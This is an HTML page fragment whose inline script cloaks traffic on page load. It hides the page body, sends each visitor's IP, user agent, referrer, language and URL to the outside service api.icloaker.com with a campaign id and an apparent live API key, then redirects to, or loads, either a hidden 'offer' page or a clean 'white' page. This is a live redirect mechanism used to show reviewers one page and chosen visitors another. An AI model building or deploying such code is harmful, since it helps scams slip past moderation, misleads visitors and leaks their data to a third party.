<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <style>
      body { display: none; }
      #overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background-color: #000; display: flex; align-items: center;
        justify-content: center; z-index: 9999;
      }
      #spinner {
        display: inline-block; width: 20px; height: 20px; border: 2px solid #666;
        border-top-color: #000; border-radius: 50%; animation: spin 0.5s ease-in-out infinite;
      }
      @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
    window.addEventListener("load", function() {
      const body = document.body;
      const overlay = document.createElement("div");
      overlay.id = "overlay";
      const spinner = document.createElement("div");
      spinner.id = "spinner";
      body.style.display = "block";
      body.appendChild(overlay);
      overlay.appendChild(spinner);
    });
    (async function() {
      try {
        const response = await fetch("https://api64.ipify.org?format=json");
        const data = await response.json();
        if (data || data.ip) {
          let apiUrl = `https://api.icloaker.com/?ip=${encodeURIComponent(data.ip)}&domain=${encodeURIComponent(window.location.hostname)}&campaign=ccb26c0b-bd59-47b1-9926-cff63047d23f&apiKey=96620d98bd62cfc976152cd90010ea41&userAgent=${encodeURIComponent(window.navigator.userAgent)}&page=${encodeURIComponent(window.location.href)}&referer=${encodeURIComponent(document.referrer)}&language=${encodeURIComponent(navigator.language)}`;
          const resultResponse = await fetch(apiUrl);
          const result = await resultResponse.json();
          if (result.error && result.error.includes('Domain/Campaign is not allowed')) {
            alert(result.error);
          } else {
            let targetUrl = result.goToOffer ? result.offerpage : result.whitepage;
            if (isURL(targetUrl)) {
              window.location.href = targetUrl;
            } else {
              $('body').load(targetUrl + '?_=' + new Date().getTime(), function(response, status, xhr) {
                if (status === "error") {
                  alert("Page not found");
                }
              });
            }
          }
        }
      } catch (error) {
        console.error("Error: ", error);
      }
    })();
function isURL(str) {
    var pattern = new RegExp('^(https?:\\/\\/)?(www\\.)?([a-zA-Z\\d]+(-[a-zA-Z\\d]+)*\\.)+[a-zA-Z]{2,}(:\\d+)?(\\/[\\w\\-\\.~:+?#%&=]*)?$', 'i');
    return pattern.test(str);
}
    </script>
